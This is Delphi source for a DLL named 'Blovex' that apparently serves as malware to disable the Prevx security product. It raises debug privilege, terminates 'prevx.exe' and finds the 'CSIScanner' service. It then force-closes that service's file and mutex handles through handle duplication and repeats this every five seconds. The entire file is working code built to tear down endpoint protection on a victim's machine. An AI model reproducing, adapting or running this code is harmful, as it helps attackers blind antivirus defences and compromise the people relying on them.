//{$DEFINE minimum}
{$E dll}
{$IMAGEBASE $00400000}
{$R-}
{$Q-}

{$IFDEF minimum}
program Blovex;
{$ENDIF}
{$IFNDEF minimum}
unit Blovex;
interface
implementation
{$ENDIF}

uses
  Windows, RTL, WinNative;

const
  String5: PWideChar = '\BaseNamedObjects\BlovexAtWork';
  ProcessesMaxID = 1;
  TargetProcesses: array[0..ProcessesMaxID] of PWideChar = ('prevx.exe', '');

type
  _SYSINFOBUF = record
    uHandleCount: ULONG;
    rHandleTable: array[0..0] of SYSTEM_HANDLE_INFORMATION;
  end;
  SYSINFOBUF = _SYSINFOBUF;
  PSYSINFOBUF = ^_SYSINFOBUF;

var
  ServicePID: ULONG = 0;
  ServiceProcessHandle: ULONG = 0;
  CurrentHandleValue: THANDLE;
  LocalPID: ULONG = 0;
  SnapShotHandle: THANDLE;
  pBuffer: PROCESSENTRY32W;
  buf: PSYSINFOBUF;
  oti: POBJECT_TYPE_INFORMATION;
  obi: OBJECT_BASIC_INFORMATION;
  str1, oni: UNICODE_STRING;

procedure KillHandleInService(Handle: THANDLE);
var
  DupHandle: THANDLE;
begin
  if (ZwDuplicateObject(ServiceProcessHandle, Handle, DWORD(-1),
    @DupHandle, 0, 0, DUPLICATE_CLOSE_SOURCE) = STATUS_SUCCESS) then
    ZwClose(DupHandle);
end;

function ThreadEntry(param: pointer): DWORD; stdcall; //заглушка для висючей ZwQueryObject
var
  iob: IO_STATUS_BLOCK;
begin
  result := ZwQueryInformationFile(DWORD(param), @iob, @oni, MAX_PATH, FileNameInformation);
end;

procedure QueryObjectName(Handle: THANDLE); stdcall;
var
  hthread: THANDLE;
  tid: cardinal;
begin
  hthread := CreateThread(nil, 0, @ThreadEntry, pointer(Handle), 0, tid);
  if (WaitForSingleObject(hthread, 500) = WAIT_TIMEOUT) then
  begin
    TerminateThread(hthread, 0);
    exit;
  end
  else
  begin
    KillHandleInService(CurrentHandleValue);
    CloseHandle(hthread);
  end;
end;

function ProcessObjectEx(hObject: THANDLE): boolean;
var
  bytesIO: DWORD;
begin
  result := false;
  memzero(@oni, sizeof(oni));
  ZwQueryObject(hObject, ObjectBasicInformation, @obi, sizeof(obi), @bytesIO);
  bytesIO := obi.TypeInformationLength + 2;
  oti := mmalloc(bytesIO);
  ZwQueryObject(hObject, ObjectTypeInformation, oti, bytesIO, @bytesIO);
  if (oti^.Name.PStr <> nil) then
    if (strcmpiW('File', oti.Name.PStr) = 0) then
      QueryObjectName(hObject)
    else
    begin
      KillHandleInService(CurrentHandleValue);
    end;
  mmfree(oti);
end;

function GetLocalPID(): boolean;
var
  i: integer;
  h: THANDLE;
begin
  result := false;

  LocalPID := 0;
  pBuffer.dwSize := sizeof(PROCESSENTRY32W);
  SnapShotHandle := CreateToolHelp32SnapShot(TH32CS_SNAPPROCESS, 0);
  if (SnapShotHandle <> INVALID_HANDLE_VALUE) then
  begin
    if Process32FirstW(SnapShotHandle, @pBuffer) then
      repeat
        for i := 0 to ProcessesMaxID - 1 do
          if (strcmpiW(pBuffer.szExeFile, TargetProcesses[i]) = 0) then
            if (pBuffer.th32ProcessID <> ServicePID) then
            begin
              LocalPID := pBuffer.th32ProcessID;
              h := OpenProcess(PROCESS_TERMINATE, false, LocalPID);
              if (h <> 0) then
              begin
                TerminateProcess(h, 0);
                CloseHandle(h);
              end;
              result := true;
              exit;
            end;

      until (not Process32NextW(SnapShotHandle, @pBuffer));
    CloseHandle(SnapShotHandle);
  end;
end;

function GetCSIProcessId(): ULONG;
var
  hscm, hsrv: SC_HANDLE;
  data: SERVICE_STATUS_PROCESS;
  bytesIO: DWORD;
begin
  result := 0;
  hscm := OpenSCManagerW(nil, nil, SC_MANAGER_ALL_ACCESS);
  if (hscm <> 0) then
  begin
    hsrv := OpenServiceW(hscm, 'CSIScanner', SERVICE_QUERY_STATUS);
    if (hsrv <> 0) then
    begin
      memzero(@data, sizeof(data));
      QueryServiceStatusEx(hsrv, 0, @data, sizeof(data), @bytesIO);
      result := data.dwProcessId;
      CloseServiceHandle(hsrv);
    end;
    CloseServiceHandle(hscm);
  end;
end;

procedure KillLocalProcess(ProcessID: ULONG);
var
  c: integer;
  cid: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;
  Status: NTSTATUS;
  hProcess, DupHandle: THANDLE;
begin
  cid.UniqueProcess := ProcessId;
  cid.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0);
  hProcess := 0;
  DupHandle := 0;
  Status := ZwOpenProcess(@hProcess, PROCESS_DUP_HANDLE, @attr, @cid);
  if (Status <> STATUS_SUCCESS) then exit;

  for c := 0 to Integer(buf^.uHandleCount) - 1 do
    if (buf^.rHandleTable[c].ProcessId = ProcessId) and (buf^.rHandleTable[c].ObjectTypeNumber = 11) then //Mutant
    begin
      Status := ZwDuplicateObject(hProcess, buf^.rHandleTable[c].Handle, DWORD(-1), @DupHandle, 0, 0, DUPLICATE_CLOSE_SOURCE);
      if (Status = STATUS_SUCCESS) then
        ZwClose(DupHandle);
    end;
  ZwClose(hProcess);
end;

var
  cid: CLIENT_ID;
  attr: OBJECT_ATTRIBUTES;

procedure FuckServiceProcess(ProcessId: ULONG);
var
  c: integer;
  Status: NTSTATUS;
  hDup: THANDLE;
begin
  cid.UniqueProcess := ProcessId;
  cid.UniqueThread := 0;
  InitializeObjectAttributes(@attr, nil, 0, 0);
  ServiceProcessHandle := 0;
  Status := ZwOpenProcess(@ServiceProcessHandle, PROCESS_DUP_HANDLE, @attr, @cid);
  if (Status <> STATUS_SUCCESS) then exit;

  for c := 0 to Integer(buf^.uHandleCount) - 1 do
    if (buf^.rHandleTable[c].ProcessId = ProcessId) then
    begin
      if (ZwDuplicateObject(ServiceProcessHandle, buf^.rHandleTable[c].Handle, DWORD(-1), @hDup,
        0, 0, DUPLICATE_SAME_ACCESS) = STATUS_SUCCESS) then
      begin
        CurrentHandleValue := buf^.rHandleTable[c].Handle;
        ProcessObjectEx(hDup);
        ZwClose(hDup);
      end;
    end;
  ZwClose(ServiceProcessHandle);
end;

procedure ScanProc(memio: ULONG);
var
  bytesIO: DWORD;
begin
  ServicePID := GetCSIProcessId();
  if (ServicePID <> 0) then
  begin
    if GetLocalPID() then
    begin
      ZwQuerySystemInformation(SystemHandleInformation, buf, memio, @bytesIO);
      KillLocalProcess(LocalPID);
      while (true) do
      begin
        NtSleep(10);
        if not GetLocalPID() then break;
      end;
      FuckServiceProcess(ServicePID);
    end;
  end;
end;

procedure main();
var
  memio: ULONG;
  EventHandle: THANDLE;
begin
  EventHandle := 0;
  Internal_AdjustPrivilege(SE_DEBUG_PRIVILEGE, TRUE, FALSE);

  memio := 4194304;
  buf := mmalloc(memio, true);
  if (buf <> nil) then
  begin
    RtlInitUnicodeString(@str1, String5);
    InitializeObjectAttributes(@attr, @str1, OBJ_CASE_INSENSITIVE, 0, nil);
    if (ZwOpenEvent(@EventHandle, EVENT_ALL_ACCESS, @attr) = STATUS_SUCCESS) then
    begin
      ScanProc(memio);
      ZwSetEvent(EventHandle, nil);
      ZwClose(EventHandle);
    end;

    while true do
    begin
      memzero(buf, 4194304);
      ScanProc(memio);
      NtSleep(5000);
    end;
    mmfree(buf);
  end;
end;

asm
  call main
  xor eax, eax
  inc eax
  retn $000c
end.

